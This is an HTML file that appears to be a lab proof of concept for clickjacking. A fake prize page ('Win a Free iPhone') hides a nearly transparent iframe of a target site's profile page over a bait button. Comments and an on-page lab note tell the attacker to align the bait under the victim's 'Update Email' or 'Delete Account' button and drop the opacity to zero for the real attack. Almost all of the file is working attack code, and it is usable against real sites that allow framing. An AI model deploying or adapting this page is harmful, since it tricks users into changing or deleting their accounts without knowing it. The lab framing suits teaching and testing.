<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Free iPhone!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8fafc;
            text-align: center;
            margin-top: 50px;
        }

        .bait-container {
            position: relative;
            width: 600px;
            height: 400px;
            margin: 0 auto;
            border: 2px dashed #cbd5e1;
            background-color: #ffffff;
            overflow: hidden;
        }

        /* The innocent-looking button the victim wants to click */
        .bait-button {
            position: absolute;
            top: 200px;  /* Adjust these values to align with the iframe's target button */
            left: 200px; /* Adjust these values to align with the iframe's target button */
            width: 200px;
            height: 50px;
            background-color: #22c55e;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            z-index: 1; /* Stays BEHIND the iframe */
        }

        /* The malicious iframe loading the victim site */
        .malicious-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 2; /* Stays ON TOP of the bait button */

            /* IMPORTANT FOR LAB:
               Keep opacity at 0.4 while aligning the iframe button over the bait button.
               Once aligned perfectly, change opacity to 0.0001 for the real attack. */
            opacity: 0.4;
        }
    </style>
</head>
<body>
    <h1>🎉 Congratulations! You are our 1,000,000th visitor! 🎉</h1>
    <p>Click the button below to instantly claim your prize.</p>

    <div class="bait-container">
        <button class="bait-button">Claim Prize Now!</button>

        <iframe
                class="malicious-iframe"
                src="http://webapp.kr-rezvan.ir/profile?allow_framing=true&disable_csp=true"
                scrolling="no"
        ></iframe>
    </div>

    <div style="margin-top: 30px; padding: 15px; background: #fee2e2; border: 1px solid #ef4444; display: inline-block; text-align: left;">
        <strong>Lab Note (Developer Tools):</strong><br>
        1. Open this page as the Hacker.<br>
        2. Adjust the CSS <code>top</code> and <code>left</code> of the `.bait-button` so it sits perfectly underneath the "Update Email" or "Delete Account" button inside the iframe.<br>
        3. Change <code>opacity: 0.4;</code> to <code>opacity: 0;</code> to finalize the attack.
    </div>
</body>
</html>